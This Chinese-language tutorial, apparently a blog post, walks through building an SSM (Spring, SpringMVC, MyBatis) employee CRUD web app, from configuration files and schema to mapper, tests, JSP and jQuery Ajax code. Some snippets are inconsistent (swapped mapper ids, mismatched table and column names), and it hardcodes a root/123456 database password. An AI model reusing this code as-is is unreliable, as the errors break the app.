<dependency>\n        <groupId>org.mybatis.generator</groupId>\n        <artifactId>mybatis-generator-core</artifactId>\n        <version>1.3.5</version>\n    </dependency>\n\n\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>4.3.7.RELEASE</version>\n    </dependency>\n\n    \x3c!-- 返回json字符串的支持 --\x3e\n    <dependency>\n        <groupId>com.fasterxml.jackson.core</groupId>\n        <artifactId>jackson-databind</artifactId>\n        <version>2.8.8</version>\n    </dependency>\n\n    \x3c!--JSR303数据校验支持；tomcat7及以上的服务器，\n    tomcat7以下的服务器：el表达式。额外给服务器的lib包中替换新的标准的el\n    --\x3e\n    <dependency>\n        <groupId>org.hibernate</groupId>\n        <artifactId>hibernate-validator</artifactId>\n        <version>5.4.1.Final</version>\n    </dependency>\n\n\n    \x3c!-- Spring-Jdbc --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-jdbc</artifactId>\n        <version>4.3.7.RELEASE</version>\n    </dependency>\n\n    \x3c!--Spring-test --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-test</artifactId>\n        <version>4.3.7.RELEASE</version>\n    </dependency>\n\n\n    \x3c!-- Spring面向切面编程 --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-aspects</artifactId>\n        <version>4.3.7.RELEASE</version>\n    </dependency>\n\n    \x3c!--MyBatis --\x3e\n    <dependency>\n        <groupId>org.mybatis</groupId>\n        <artifactId>mybatis</artifactId>\n        <version>3.4.2</version>\n    </dependency>\n\n    \x3c!-- MyBatis整合Spring的适配包 --\x3e\n    <dependency>\n        <groupId>org.mybatis</groupId>\n        <artifactId>mybatis-spring</artifactId>\n        <version>1.3.1</version>\n    </dependency>\n\n    \x3c!-- 数据库连接池、驱动 --\x3e\n    <dependency>\n        <groupId>c3p0</groupId>\n        <artifactId>c3p0</artifactId>\n        <version>0.9.1</version>\n    </dependency>\n\n    <dependency>\n        <groupId>mysql</groupId>\n        <artifactId>mysql-connector-java</artifactId>\n        <version>5.1.41</version>\n    </dependency>\n\n    \x3c!-- （jstl，servlet-api，junit） --\x3e\n    <dependency>\n        <groupId>jstl</groupId>\n        <artifactId>jstl</artifactId>\n        <version>1.2</version>\n    </dependency>\n\n    <dependency>\n        <groupId>javax.servlet</groupId>\n        <artifactId>javax.servlet-api</artifactId>\n        <version>3.0.1</version>\n        <scope>provided</scope>\n    </dependency>\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n\n\n\n# 引入前端资源\n\n<script type="text/javascript"\n\tsrc="${APP_PATH }/static/js/jquery-1.12.4.min.js"><\/script>\n<link\n\thref="${APP_PATH }/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"\n\trel="stylesheet">\n<script\n\tsrc="${APP_PATH }/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"><\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 配置web.xml\n\n<!DOCTYPE web-app PUBLIC\n "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"\n "http://java.sun.com/dtd/web-app_2_3.dtd" >\n\n<web-app>\n    \x3c!-- spring配置文件 加载 --\x3e\n    <context-param>\n        <param-name>contextConfigLocation</param-name>\n        <param-value>classpath:applicationContext.xml</param-value>\n    </context-param>\n\n    \x3c!-- 编码拦截器 --\x3e\n    <filter>\n        <filter-name>encodingFilter</filter-name>\n        <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n        <init-param>\n            <param-name>encoding</param-name>\n            <param-value>utf-8</param-value>\n        </init-param>\n        <init-param>\n            <param-name>forceRequestEncoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n        <init-param>\n            <param-name>forceResponseEncoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n    </filter>\n\n    \x3c!-- rest风格拦截器 --\x3e\n    <filter>\n        <filter-name>hiddenHttpMethodFilter</filter-name>\n        <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>encodingFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    <filter-mapping>\n        <filter-name>hiddenHttpMethodFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    \x3c!-- 加载Ioc容器 --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n    </listener>\n\n    \x3c!-- 配置mvc拦截器 --\x3e\n    <servlet>\n        <servlet-name>dispatcherServlet</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            <param-value>classpath:spring-mvc.xml</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>dispatcherServlet</servlet-name>\n        <url-pattern>/</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\n配置SpringMVC配置文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:mvc="http://www.springframework.org/schema/mvc"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd">\n\n    \x3c!-- 不适用默认拦截器，配置只拦截COntroller包 --\x3e\n    <context:component-scan base-package="com.pwddd.ssm" use-default-filters="false">\n        <context:include-filter type="annotation" expression="org.springframework.stereotype.Controller"/>\n    </context:component-scan>\n\n    <bean class="org.springframework.web.servlet.view.InternalResourceViewResolver" id="viewResolver">\n        <property name="prefix" value="/WEB-INF/views/" />\n        <property name="suffix" value=".jsp" />\n    </bean>\n\n    \x3c!--  SpirngMvc处理不了的 交给tomcat   --\x3e\n    <mvc:default-servlet-handler default-servlet-name="default"/>\n    <mvc:annotation-driven />\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n配置数据库连接信息\n\njdbc.driver=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_crud\njdbc.username=root\njdbc.password=123456\n\n\n1\n2\n3\n4\n\n\n配置spring配置文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd">\n\n    <context:component-scan base-package="com.pwddd.ssm">\n        <context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>\n    </context:component-scan>\n\n    <context:property-placeholder location="classpath:jdbc.properties" />\n    <bean class="com.mchange.v2.c3p0.ComboPooledDataSource" id="dataSource">\n        <property name="driverClass" value="${jdbc.driver}" />\n        <property name="jdbcUrl" value="${jdbc.url}" />\n        <property name="user" value="${jdbc.username}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n\n    <bean class="org.springframework.jdbc.datasource.DataSourceTransactionManager" id="dataSourceTransactionManager">\n        <property name="dataSource" ref="dataSource" />\n    </bean>\n\n    \x3c!--  mybatis整合  --\x3e\n    <bean class="org.mybatis.spring.SqlSessionFactoryBean" id="sqlSessionFactory" >\n        <property name="dataSource" ref="dataSource" />\n        <property name="configLocation" value="classpath:mybatis-config.xml" />\n        <property name="mapperLocations" value="classpath:mapper/*.xml" />\n    </bean>\n\n    <bean class="org.mybatis.spring.mapper.MapperScannerConfigurer" >\n        <property name="basePackage" value="com.pwddd.ssm.dao" />\n    </bean>\n\n    \x3c!--  事务相关的配置  --\x3e\n    <aop:config>\n        <aop:pointcut id="txPoint" expression="execution(* com.pwddd.service..*(..))" />\n        <aop:advisor advice-ref="txAdvice" pointcut-ref="txPoint" />\n    </aop:config>\n\n    <tx:advice id="txAdvice" transaction-manager="dataSourceTransactionManager">\n        <tx:attributes>\n            <tx:method name="*"/>\n            <tx:method name="get*" read-only="true" />\n        </tx:attributes>\n    </tx:advice>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# 配置Mybatis配置文件\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE configuration\n        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    <settings>\n        <setting name="mapUnderscoreToCamelCase" value="true"/>\n    </settings>\n\n    <typeAliases>\n        <package name="com.pwddd.ssm.bean"/>\n    </typeAliases>\n\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 创建数据库表\n\n/*\n Navicat Premium Data Transfer\n\n Source Server         : localhost\n Source Server Type    : MySQL\n Source Server Version : 50728\n Source Host           : localhost:3306\n Source Schema         : ssm_crud\n\n Target Server Type    : MySQL\n Target Server Version : 50728\n File Encoding         : 65001\n\n Date: 24/02/2022 14:48:02\n*/\n\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for tbl_dept\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_dept`;\nCREATE TABLE `tbl_dept`  (\n  `dept_id` int(11) NOT NULL AUTO_INCREMENT,\n  `dept_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  PRIMARY KEY (`dept_id`) USING BTREE\n) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Table structure for tbl_employee\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_employee`;\nCREATE TABLE `tbl_employee`  (\n  `emp_id` int(11) NOT NULL AUTO_INCREMENT,\n  `emp_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `gender` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `email` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `d_id` int(11) NOT NULL,\n  PRIMARY KEY (`emp_id`) USING BTREE,\n  INDEX `fk_dept`(`d_id`) USING BTREE,\n  CONSTRAINT `fk_dept` FOREIGN KEY (`d_id`) REFERENCES `tbl_dept` (`dept_id`) ON DELETE RESTRICT ON UPDATE RESTRICT\n) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\nSET FOREIGN_KEY_CHECKS = 1;\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# Mybatis逆向工程\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorConfiguration>\n\n    <context id="mybatismysql" targetRuntime="MyBatis3">\n        <commentGenerator>\n            <property name="suppressAllComments" value="true" />\n        </commentGenerator>\n        \x3c!-- 配置数据库连接 --\x3e\n        <jdbcConnection driverClass="com.mysql.jdbc.Driver"\n                        connectionURL="jdbc:mysql://localhost:3306/ssm_crud?useSSL=false"\n                        userId="root"\n                        password="123456">\n        </jdbcConnection>\n\n        <javaTypeResolver>\n            <property name="forceBigDecimals" value="false" />\n        </javaTypeResolver>\n\n        \x3c!-- 指定javaBean生成的位置 --\x3e\n        <javaModelGenerator targetPackage="com.pwddd.ssm.bean"\n                            targetProject=".\\src\\main\\java">\n            <property name="enableSubPackages" value="true" />\n            <property name="trimStrings" value="true" />\n        </javaModelGenerator>\n\n        \x3c!--指定sql映射文件生成的位置 --\x3e\n        <sqlMapGenerator targetPackage="mapper" targetProject=".\\src\\main\\resources">\n            <property name="enableSubPackages" value="true" />\n        </sqlMapGenerator>\n\n        \x3c!-- 指定dao接口生成的位置，mapper接口 --\x3e\n        <javaClientGenerator type="XMLMAPPER"\n                             targetPackage="com.pwddd.ssm.dao" targetProject=".\\src\\main\\java">\n            <property name="enableSubPackages" value="true" />\n        </javaClientGenerator>\n\n\n        \x3c!-- table指定每个表的生成策略 --\x3e\n        <table tableName="tbl_emp" domainObjectName="Employee"></table>\n        <table tableName="tbl_dept" domainObjectName="Department"></table>\n    </context>\n</generatorConfiguration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n启动逆向工程\n\npublic static void main(String[] args) throws Exception {\n    List<String> warnings = new ArrayList<String>();\n    boolean overwrite = true;\n    File configFile = new File("mbg.xml");\n    ConfigurationParser cp = new ConfigurationParser(warnings);\n    Configuration config = cp.parseConfiguration(configFile);\n    DefaultShellCallback callback = new DefaultShellCallback(overwrite);\n    MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings);\n    myBatisGenerator.generate(null);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 修改生成的Mapper\n\n  <select id="selectByPrimaryKeyWithDept" resultMap="WithDeptResultMap">\n      select\n      <if test="distinct">\n        distinct\n      </if>\n      <include refid="WithDept_Column_List" />\n      from tbl_employee e left join tbl_dept d on e.d_id = d.dept_id\n      <if test="_parameter != null">\n        <include refid="Example_Where_Clause" />\n      </if>\n      <if test="orderByClause != null">\n        order by ${orderByClause}\n      </if>\n  </select>\n\n  <select id="selectByExampleWithDept" resultMap="WithDeptResultMap">\n    select\n    <include refid="WithDept_Column_List" />\n    from tbl_employee e left join tbl_dept d on e.d_id = d.dept_id\n    where emp_id = #{empId,jdbcType=INTEGER}\n\n  </select>\n\n  \x3c!--自定义联合查询--\x3e\n  <sql id="WithDept_Column_List">\n    e.emp_id, e.emp_name, e.gender, e.email, e.dept_id , d.dept_name\n  </sql>\n\n  <resultMap id="WithDeptResultMap" type="com.pwddd.ssm.bean.Employee">\n    <id column="emp_id" jdbcType="INTEGER" property="empId" />\n    <result column="emp_name" jdbcType="VARCHAR" property="empName" />\n    <result column="gender" jdbcType="CHAR" property="gender" />\n    <result column="email" jdbcType="VARCHAR" property="email" />\n    <association property="department" javaType="com.pwddd.ssm.bean.Department">\n      <result column="dept_id" property="deptId" />\n      <result column="dept_name" property="deptName" />\n    </association>\n  </resultMap> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# Spring注入 测试Dao层\n\n为了批量插入数据库，需要配置一个批量操作的SQLsession\n\n<bean class="org.mybatis.spring.SqlSessionTemplate" id="sqlSession">\n    <constructor-arg index="0" ref="sqlSessionFactory" />\n    <constructor-arg index="1" value="BATCH" />\n</bean>\n\n\n1\n2\n3\n4\n\n\n批量插入数据\n\n    @Test\n    public void testEmp(){\n        EmployeeMapper mapper = sqlSession.getMapper(EmployeeMapper.class);\n\n        for (int i = 0 ; i<=10000;i++){\n            mapper.insertSelective(new Employee(\n                UUID.randomUUID().toString().substring(0,5),\n                "M",\n                UUID.randomUUID().toString().substring(0,5)+"@qq.com",\n                1));\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 数据处理\n\n\n# 查询员工列表\n\n 1. 编写Controller，接收请求\n\n@GetMapping("/emps")\npublic String getEmps(@RequestParam(value = "pn",defaultValue = "1")Integer pn,\n                      @RequestParam(value = "num",defaultValue = "5")Integer num,\n                      Model model){\n    // 设置分页\n    PageHelper.startPage(pn,num);\n    List<Employee> employees = employeeService.getEmps();\n    PageInfo pageInfo = new PageInfo(employees,5);\n    model.addAttribute("pageInfo",pageInfo);\n    return "list";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. 配置分页插件\n\n<plugins>\n    <plugin interceptor="com.github.pagehelper.PageInterceptor" />\n</plugins>\n\n\n1\n2\n3\n\n 3. 测试查询\n\nimport com.github.pagehelper.PageInfo;\nimport com.pwddd.ssm.bean.Employee;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.mock.web.MockHttpServletRequest;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringJUnit4ClassRunner;\nimport org.springframework.test.context.web.WebAppConfiguration;\nimport org.springframework.test.web.servlet.MockMvc;\nimport org.springframework.test.web.servlet.MockMvcBuilder;\nimport org.springframework.test.web.servlet.MvcResult;\nimport org.springframework.test.web.servlet.request.MockMvcRequestBuilders;\nimport org.springframework.test.web.servlet.setup.MockMvcBuilders;\nimport org.springframework.web.context.WebApplicationContext;\n\nimport java.util.List;\n\n@WebAppConfiguration\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(locations = {"classpath:applicationContext.xml","classpath:spring-mvc.xml"})\npublic class TestMVC {\n\n    @Autowired\n    private WebApplicationContext applicationContext;\n\n    private MockMvc mockMvc;\n\n    @Before\n    public void init(){\n        mockMvc = MockMvcBuilders.webAppContextSetup(applicationContext).build();\n    }\n\n    @Test\n    public void testSelectAllEmps() throws Exception {\n        MvcResult mvcResult = mockMvc.perform(MockMvcRequestBuilders.get("/emps")\n                .param("pn", "1").param("num", "20")).andReturn();\n        MockHttpServletRequest request = mvcResult.getRequest();\n        PageInfo pageInfo = (PageInfo) request.getAttribute("pageInfo");\n        System.out.println(pageInfo);\n        List<Employee> list = pageInfo.getList();\n        for (Employee employee :\n        list) {\n            System.out.println(employee.getEmpId());\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 4. 编写页面,Index.jsp设置跳转我们的请求地址。\n\n\n<%@ page language="java" contentType="text/html; charset=UTF-8"\n         pageEncoding="UTF-8"%>\n<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>\n<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<html>\n<head>\n    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">\n    <title>员工列表</title>\n<%\n    pageContext.setAttribute("APP_PATH", request.getContextPath());\n%>\n    \x3c!-- web路径：\n不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出问题。\n以/开始的相对路径，找资源，以服务器的路径为标准(http://localhost:3306)；需要加上项目名\n\t\thttp://localhost:3306/crud\n --\x3e\n    <script type="text/javascript"\n            src="${APP_PATH}/static/js/jquery-1.12.4.min.js"><\/script>\n    <link\n            href="${APP_PATH}/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"\n            rel="stylesheet">\n    <script\n            src="${APP_PATH}/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"><\/script>\n</head>\n<body>\n\x3c!-- 搭建显示页面 --\x3e\n<div class="container">\n    \x3c!-- 标题 --\x3e\n    <div class="row">\n        <div class="col-md-12">\n            <h1>SSM-CRUD</h1>\n        </div>\n    </div>\n    \x3c!-- 按钮 --\x3e\n    <div class="row">\n        <div class="col-md-4 col-md-offset-8">\n            <button class="btn btn-primary">新增</button>\n            <button class="btn btn-danger">删除</button>\n        </div>\n    </div>\n    \x3c!-- 显示表格数据 --\x3e\n    <div class="row">\n        <div class="col-md-12">\n            <table class="table table-hover">\n                <tr>\n                    <th>#</th>\n                    <th>empName</th>\n                    <th>gender</th>\n                    <th>email</th>\n                    <th>deptName</th>\n                    <th>操作</th>\n                </tr>\n                <c:forEach items="${pageInfo.list }" var="emp">\n                    <tr>\n                        <th>${emp.empId }</th>\n                        <th>${emp.empName }</th>\n                        <th>${emp.gender=="M"?"男":"女" }</th>\n                        <th>${emp.email }</th>\n                        <th>${emp.department.deptName }</th>\n                        <th>\n                            <button class="btn btn-primary btn-sm">\n                                <span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>\n                                编辑\n                            </button>\n                            <button class="btn btn-danger btn-sm">\n                                <span class="glyphicon glyphicon-trash" aria-hidden="true"></span>\n                                删除\n                            </button>\n                        </th>\n                    </tr>\n                </c:forEach>\n            </table>\n        </div>\n    </div>\n\n    \x3c!-- 显示分页信息 --\x3e\n    <div class="row">\n        \x3c!--分页文字信息  --\x3e\n        <div class="col-md-6">当前 ${pageInfo.pageNum }页,总${pageInfo.pages }\n            页,总 ${pageInfo.total } 条记录</div>\n        \x3c!-- 分页条信息 --\x3e\n        <div class="col-md-6">\n            <nav aria-label="Page navigation">\n                <ul class="pagination">\n                    <li><a href="${APP_PATH }/emps?pn=1">首页</a></li>\n                    <c:if test="${pageInfo.hasPreviousPage }">\n                        <li><a href="${APP_PATH }/emps?pn=${pageInfo.pageNum-1}"\n                               aria-label="Previous"> <span aria-hidden="true">&laquo;</span>\n                        </a></li>\n                    </c:if>\n\n\n                    <c:forEach items="${pageInfo.navigatepageNums }" var="page_Num">\n                        <c:if test="${page_Num == pageInfo.pageNum }">\n                            <li class="active"><a href="#">${page_Num }</a></li>\n                        </c:if>\n                        <c:if test="${page_Num != pageInfo.pageNum }">\n                            <li><a href="${APP_PATH }/emps?pn=${page_Num }">${page_Num }</a></li>\n                        </c:if>\n\n                    </c:forEach>\n                    <c:if test="${pageInfo.hasNextPage }">\n                        <li><a href="${APP_PATH }/emps?pn=${pageInfo.pageNum+1 }"\n                               aria-label="Next"> <span aria-hidden="true">&raquo;</span>\n                        </a></li>\n                    </c:if>\n                    <li><a href="${APP_PATH }/emps?pn=${pageInfo.pages}">末页</a></li>\n                </ul>\n            </nav>\n        </div>\n    </div>\n\n</div>\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n\n 5. 注意：idea自动生成的web-app版本为2.3，该版本的web-app并不支持EL表达式，因此我们编写的jsp页面会出错。需要将web.xml的文档约束修改为如下的内容：\n\n<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee\n         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"\n         version="3.1">\n\n\n1\n2\n3\n4\n5\n\n\n# 使用Ajax请求\n\n//1、页面加载完成以后，直接去发送ajax请求,要到分页数据\n$(function(){\n    //去首页\n    to_page(1);\n});\nfunction to_page(pn){\n    $.ajax({\n        url:"${APP_PATH}/emps",\n        data:"pn="+pn,\n        type:"GET",\n        success:function(result){\n            //console.log(result);\n            //1、解析并显示员工数据\n            build_emps_table(result);\n            //2、解析并显示分页信息\n            build_page_info(result);\n            //3、解析显示分页条数据\n            build_page_nav(result);\n        }\n    });\n}\n\nfunction build_emps_table(result){\n    //清空table表格\n    $("#emps_table tbody").empty();\n    var emps = result.extend.pageInfo.list;\n    $.each(emps,function(index,item){\n        var checkBoxTd = $("<td><input type=\'checkbox\' class=\'check_item\'/></td>");\n        var empIdTd = $("<td></td>").append(item.empId);\n        var empNameTd = $("<td></td>").append(item.empName);\n        var genderTd = $("<td></td>").append(item.gender==\'M\'?"男":"女");\n        var emailTd = $("<td></td>").append(item.email);\n        var deptNameTd = $("<td></td>").append(item.department.deptName);\n        /**\n             <button class="">\n             <span class="" aria-hidden="true"></span>\n             编辑\n             </button>\n             */\n        var editBtn = $("<button></button>").addClass("btn btn-primary btn-sm edit_btn")\n        .append($("<span></span>").addClass("glyphicon glyphicon-pencil")).append("编辑");\n        //为编辑按钮添加一个自定义的属性，来表示当前员工id\n        editBtn.attr("edit-id",item.empId);\n        var delBtn =  $("<button></button>").addClass("btn btn-danger btn-sm delete_btn")\n        .append($("<span></span>").addClass("glyphicon glyphicon-trash")).append("删除");\n        //为删除按钮添加一个自定义的属性来表示当前删除的员工id\n        delBtn.attr("del-id",item.empId);\n        var btnTd = $("<td></td>").append(editBtn).append(" ").append(delBtn);\n        //var delBtn =\n        //append方法执行完成以后还是返回原来的元素\n        $("<tr></tr>").append(checkBoxTd)\n            .append(empIdTd)\n            .append(empNameTd)\n            .append(genderTd)\n            .append(emailTd)\n            .append(deptNameTd)\n            .append(btnTd)\n            .appendTo("#emps_table tbody");\n    });\n}\n//解析显示分页信息\nfunction build_page_info(result){\n    $("#page_info_area").empty();\n    $("#page_info_area").append("当前"+result.extend.pageInfo.pageNum+"页,总"+\n                                result.extend.pageInfo.pages+"页,总"+\n                                result.extend.pageInfo.total+"条记录");\n    totalRecord = result.extend.pageInfo.total;\n    currentPage = result.extend.pageInfo.pageNum;\n}\n//解析显示分页条，点击分页要能去下一页....\nfunction build_page_nav(result){\n    //page_nav_area\n    $("#page_nav_area").empty();\n    var ul = $("<ul></ul>").addClass("pagination");\n\n    //构建元素\n    var firstPageLi = $("<li></li>").append($("<a></a>").append("首页").attr("href","#"));\n    var prePageLi = $("<li></li>").append($("<a></a>").append("&laquo;"));\n    if(result.extend.pageInfo.hasPreviousPage == false){\n        firstPageLi.addClass("disabled");\n        prePageLi.addClass("disabled");\n    }else{\n        //为元素添加点击翻页的事件\n        firstPageLi.click(function(){\n            to_page(1);\n        });\n        prePageLi.click(function(){\n            to_page(result.extend.pageInfo.pageNum -1);\n        });\n    }\n\n\n\n    var nextPageLi = $("<li></li>").append($("<a></a>").append("&raquo;"));\n    var lastPageLi = $("<li></li>").append($("<a></a>").append("末页").attr("href","#"));\n    if(result.extend.pageInfo.hasNextPage == false){\n        nextPageLi.addClass("disabled");\n        lastPageLi.addClass("disabled");\n    }else{\n        nextPageLi.click(function(){\n            to_page(result.extend.pageInfo.pageNum +1);\n        });\n        lastPageLi.click(function(){\n            to_page(result.extend.pageInfo.pages);\n        });\n    }\n\n\n\n    //添加首页和前一页 的提示\n    ul.append(firstPageLi).append(prePageLi);\n    //1,2，3遍历给ul中添加页码提示\n    $.each(result.extend.pageInfo.navigatepageNums,function(index,item){\n\n        var numLi = $("<li></li>").append($("<a></a>").append(item));\n        if(result.extend.pageInfo.pageNum == item){\n            numLi.addClass("active");\n        }\n        numLi.click(function(){\n            to_page(item);\n        });\n        ul.append(numLi);\n    });\n    //添加下一页和末页 的提示\n    ul.append(nextPageLi).append(lastPageLi);\n\n    //把ul加入到nav\n    var navEle = $("<nav></nav>").append(ul);\n    